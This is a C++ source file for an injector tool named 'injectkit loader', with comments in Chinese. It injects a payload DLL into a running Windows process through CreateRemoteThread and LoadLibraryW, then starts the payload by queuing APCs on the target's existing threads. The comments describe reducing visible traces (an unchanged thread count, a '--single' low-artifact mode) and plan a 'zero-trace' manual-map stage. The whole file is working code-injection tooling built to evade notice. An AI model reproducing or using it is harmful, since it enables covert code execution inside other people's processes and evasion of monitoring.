// loader/main.cpp —— 注入器
//
// 两种触发方式：
//
//   --mode thread   LoadLibrary 注入（payload 自己 CreateThread）
//                   代价：目标多一个线程 + 多一个模块
//
//   --mode apc      LoadLibrary 注入 + APC 触发（payload 不起线程）
//                   代价：目标多一个模块，但线程数不变
//
// 第三种（真正的零痕迹）需要 manual map + APC，那是 P2 后半段的工作。
#include <windows.h>
#include <tlhelp32.h>

#include <cstdio>
#include <cstring>
#include <string>

#include "loader/apc_inject.hpp"

namespace {

DWORD find_process(const wchar_t* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    DWORD found = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                found = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// LoadLibrary 注入，返回 payload 基址
bool inject_loadlibrary(DWORD pid, const wchar_t* dllPath, HMODULE* outBase) {
    constexpr DWORD kAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                              PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    HANDLE hProc = OpenProcess(kAccess, FALSE, pid);
    if (!hProc) {
        printf("  OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    const size_t pathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    void* remotePath = VirtualAllocEx(hProc, nullptr, pathBytes,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        printf("  VirtualAllocEx 失败: %lu\n", GetLastError());
        CloseHandle(hProc);
        return false;
    }

    SIZE_T wrote = 0;
    if (!WriteProcessMemory(hProc, remotePath, dllPath, pathBytes, &wrote) ||
        wrote != pathBytes) {
        printf("  WriteProcessMemory 失败: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    const auto loadLib = reinterpret_cast<LPTHREAD_START_ROUTINE>(
        GetProcAddress(k32, "LoadLibraryW"));
    if (!loadLib) {
        printf("  找不到 LoadLibraryW\n");
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    // 注意：这一步用的是 CreateRemoteThread —— 但它是**临时的**，
    // 只为了执行 LoadLibraryW。它会在 LoadLibrary 返回后立刻退出。
    //
    // 所以"线程数 +1"在 LoadLibrary 期间是存在的，之后消失。
    // 真正的常驻线程是 payload 自己创建的（--mode thread）或不起（--mode apc）。
    HANDLE th = CreateRemoteThread(hProc, nullptr, 0, loadLib, remotePath, 0, nullptr);
    if (!th) {
        printf("  CreateRemoteThread 失败: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    WaitForSingleObject(th, 10000);
    DWORD exitCode = 0;
    GetExitCodeThread(th, &exitCode);
    CloseHandle(th);

    VirtualFreeEx(hProc, remotePath, 0, MEM_RELEASE);

    if (exitCode == 0) {
        printf("  LoadLibraryW 返回 0（DLL 加载失败）\n");
        CloseHandle(hProc);
        return false;
    }

    // ★ 关键：GetExitCodeThread 只能返回 32 位 DWORD，而 HMODULE 是 64 位。
    //   直接用它当基址会**截断**。
    //
    //   实测：目标里实际基址 0x7FF81B210000，但 exitCode 只给出 0x1B210000。
    //   用截断的地址去读内存 → ERROR_PARTIAL_COPY (299)。
    //
    //   正确做法：用 Toolhelp 快照查目标进程的模块列表，按 DLL 文件名找
    //   真实基址。这比"从返回值推断"可靠得多。
    const wchar_t* dllBaseName = wcsrchr(dllPath, L'\\');
    dllBaseName = dllBaseName ? dllBaseName + 1 : dllPath;

    HMODULE realBase = nullptr;
    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (snap != INVALID_HANDLE_VALUE) {
            MODULEENTRY32W me{};
            me.dwSize = sizeof(me);
            if (Module32FirstW(snap, &me)) {
                do {
                    if (_wcsicmp(me.szModule, dllBaseName) == 0) {
                        realBase = reinterpret_cast<HMODULE>(me.modBaseAddr);
                        break;
                    }
                } while (Module32NextW(snap, &me));
            }
            CloseHandle(snap);
        }
    }

    CloseHandle(hProc);

    if (!realBase) {
        printf("  警告：模块列表里找不到 %ls（可能已被卸载）\n", dllBaseName);
        realBase = reinterpret_cast<HMODULE>(static_cast<uintptr_t>(exitCode));
    } else if (reinterpret_cast<uintptr_t>(realBase) != static_cast<uintptr_t>(exitCode)) {
        printf("  注：真实基址 0x%llX（GetExitCodeThread 只能给低 32 位）\n",
               static_cast<unsigned long long>(reinterpret_cast<uintptr_t>(realBase)));
    }

    if (outBase) *outBase = realBase;
    return true;
}

// 计算 payload 里某个导出的 RVA
//
// 关键：磁盘上的 PE 文件是 **raw layout**（按文件对齐 0x200），
// 而 RVA 是 **virtual layout**（按节对齐 0x1000）。
// 不能直接 base + rva 索引文件内容 —— 必须先把 RVA 转成文件偏移。
//
// 第一版就是漏了这一步，导致读到了错误位置然后段错误。
struct PeFile {
    const uint8_t* base = nullptr;
    HANDLE hMap = nullptr;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    ~PeFile() {
        if (base) UnmapViewOfFile(base);
        if (hMap) CloseHandle(hMap);
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    }

    bool open(const wchar_t* path) {
        hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        hMap = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
        if (!hMap) return false;
        base = static_cast<const uint8_t*>(MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0));
        return base != nullptr;
    }

    const IMAGE_NT_HEADERS64* nt() const {
        const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
        const auto* n = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
        return n->Signature == IMAGE_NT_SIGNATURE ? n : nullptr;
    }

    // RVA → 文件偏移。找不到返回 0（且 rva!=0 时说明出错）
    uint32_t rva_to_offset(uint32_t rva) const {
        const auto* n = nt();
        if (!n) return 0;

        const auto* sec = IMAGE_FIRST_SECTION(n);
        for (int i = 0; i < n->FileHeader.NumberOfSections; ++i) {
            const uint32_t va = sec[i].VirtualAddress;
            const uint32_t vsize = sec[i].Misc.VirtualSize;
            if (rva >= va && rva < va + vsize) {
                return sec[i].PointerToRawData + (rva - va);
            }
        }
        // 落在头部（SizeOfHeaders 内）
        if (rva < n->OptionalHeader.SizeOfHeaders) return rva;
        return 0;
    }
};

uint64_t exported_rva(const wchar_t* dllPath, const char* exportName) {
    PeFile pf;
    if (!pf.open(dllPath)) return 0;

    const auto* n = pf.nt();
    if (!n) return 0;

    const auto& dir = n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return 0;

    const uint32_t expOff = pf.rva_to_offset(dir.VirtualAddress);
    if (!expOff) return 0;
    const auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(pf.base + expOff);

    const uint32_t namesOff = pf.rva_to_offset(exp->AddressOfNames);
    const uint32_t funcsOff = pf.rva_to_offset(exp->AddressOfFunctions);
    const uint32_t ordsOff = pf.rva_to_offset(exp->AddressOfNameOrdinals);
    if (!namesOff || !funcsOff || !ordsOff) return 0;

    const auto* names = reinterpret_cast<const DWORD*>(pf.base + namesOff);
    const auto* funcs = reinterpret_cast<const DWORD*>(pf.base + funcsOff);
    const auto* ords = reinterpret_cast<const WORD*>(pf.base + ordsOff);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const uint32_t nmOff = pf.rva_to_offset(names[i]);
        if (!nmOff) continue;
        const char* nm = reinterpret_cast<const char*>(pf.base + nmOff);
        if (strcmp(nm, exportName) == 0) {
            return funcs[ords[i]];
        }
    }
    return 0;
}

}  // namespace

int wmain(int argc, wchar_t** argv) {
    SetConsoleOutputCP(936);
    printf("=== injectkit loader (P2) ===\n\n");

    const wchar_t* targetExe = nullptr;
    const wchar_t* dllPath = nullptr;
    const wchar_t* mode = L"thread";
    apr::Strategy strat = apr::Strategy::AllThreads;

    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"--target") == 0 && i + 1 < argc) {
            targetExe = argv[++i];
        } else if (wcscmp(argv[i], L"--dll") == 0 && i + 1 < argc) {
            dllPath = argv[++i];
        } else if (wcscmp(argv[i], L"--mode") == 0 && i + 1 < argc) {
            mode = argv[++i];
        } else if (wcscmp(argv[i], L"--single") == 0) {
            strat = apr::Strategy::SingleThenAlert;
        } else if (wcscmp(argv[i], L"--help") == 0 || wcscmp(argv[i], L"-h") == 0) {
            printf("用法：\n");
            printf("  ikloader.exe --target <exe> --dll <payload> [--mode thread|apc] [--single]\n\n");
            printf("模式：\n");
            printf("  thread  payload 自己创建线程（多一个线程）\n");
            printf("  apc     用 APC 在已有线程上跑（线程数不变）\n\n");
            printf("--single  只向一个线程排 APC 并强制 alert（痕迹更少）\n");
            return 0;
        }
    }

    if (!targetExe || !dllPath) {
        printf("缺少参数。用 --help 看用法。\n");
        return 1;
    }

    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("DLL 不存在: %ls\n", dllPath);
        return 1;
    }

    wchar_t fullPath[MAX_PATH * 2] = {};
    GetFullPathNameW(dllPath, MAX_PATH * 2, fullPath, nullptr);

    printf("目标进程: %ls\n", targetExe);
    printf("payload : %ls\n", fullPath);
    printf("模式    : %ls\n\n", mode);

    const DWORD pid = find_process(targetExe);
    if (pid == 0) {
        printf("找不到进程: %ls\n", targetExe);
        return 1;
    }
    printf("找到 pid = %lu\n", pid);

    // ---- 步骤 1：注入 DLL ----
    HMODULE base = nullptr;
    if (!inject_loadlibrary(pid, fullPath, &base)) {
        printf("\n注入失败\n");
        return 1;
    }
    printf("DLL 已加载，基址 = 0x%p\n", (void*)base);

    // ---- 步骤 2：按模式触发 ----
    const bool useApc = (wcscmp(mode, L"apc") == 0);

    if (!useApc) {
        // thread 模式：payload 的 DllMain 会自己 CreateThread
        printf("\n模式 thread：payload 会自己创建线程\n");
        printf("  预期：目标线程数 +1\n");
        printf("  验证：tasklist /M 或 Get-Process | Select Threads\n\n");
        printf("注意：这个模式需要 payload 里的 ik_spawn_thread 被调用。\n");
        printf("      当前 payload 默认不起线程（APC 优先），\n");
        printf("      所以要先排一次 APC 让它执行 ik_spawn_thread。\n");

        const uint64_t spawnRva = exported_rva(fullPath, "ik_spawn_thread");
        if (spawnRva == 0) {
            printf("  找不到 ik_spawn_thread 导出\n");
            return 1;
        }
        const uint64_t spawnAddr = reinterpret_cast<uint64_t>(base) + spawnRva;
        printf("  ik_spawn_thread @ 0x%llX\n", (unsigned long long)spawnAddr);

        int queued = 0;
        const apr::Result r = apr::queue_apc(pid, spawnAddr, 0, strat, &queued);
        printf("  APC 排队: %s (排给 %d 个线程)\n", apr::result_name(r), queued);
        if (r != apr::Result::Ok) return 1;
    } else {
        // apc 模式：只排 apc_agent_proc，不创建线程
        printf("\n模式 apc：不创建线程\n");

        // 步骤 A：从磁盘 DLL 拿 ik_apc_proc_ptr 这个**数据符号**的 RVA。
        //
        // 为什么是数据符号而不是函数：loader 在外部，无法调用目标里的
        // 函数来取地址。但静态数据可以直接读。
        const uint64_t varRva = exported_rva(fullPath, "ik_apc_proc_ptr");
        if (varRva == 0) {
            printf("  找不到 ik_apc_proc_ptr 导出\n");
            return 1;
        }
        printf("  ik_apc_proc_ptr RVA = 0x%llX\n", (unsigned long long)varRva);

        // 步骤 B：读目标内存里那个变量的值 = apc_agent_proc 的绝对地址
        HANDLE hProc = OpenProcess(PROCESS_VM_READ, FALSE, pid);
        if (!hProc) {
            printf("  OpenProcess(VM_READ) 失败: %lu\n", GetLastError());
            return 1;
        }

        uint64_t procAddr = 0;
        SIZE_T got = 0;
        const void* varAddr = reinterpret_cast<const void*>(
            reinterpret_cast<uintptr_t>(base) + varRva);
        if (!ReadProcessMemory(hProc, varAddr, &procAddr, sizeof(procAddr), &got) ||
            got != sizeof(procAddr)) {
            printf("  读 ik_apc_proc_ptr 失败: %lu\n", GetLastError());
            CloseHandle(hProc);
            return 1;
        }
        CloseHandle(hProc);

        printf("  apc_agent_proc @ 0x%llX\n", (unsigned long long)procAddr);
        if (procAddr == 0) {
            printf("  指针为 0（bootstrap 可能没执行）\n");
            return 1;
        }

        // 步骤 C：向已有线程排 APC
        int queued = 0;
        const apr::Result r = apr::queue_apc(pid, procAddr, 0, strat, &queued);
        printf("  APC 排队: %s (排给 %d 个线程)\n", apr::result_name(r), queued);
        if (r != apr::Result::Ok) return 1;

        printf("\n  APC 已入队，会在目标线程下次进入 alertable wait 时执行。\n");
        printf("  预期：目标线程数不变\n");
    }

    printf("\n完成\n");
    return 0;
}
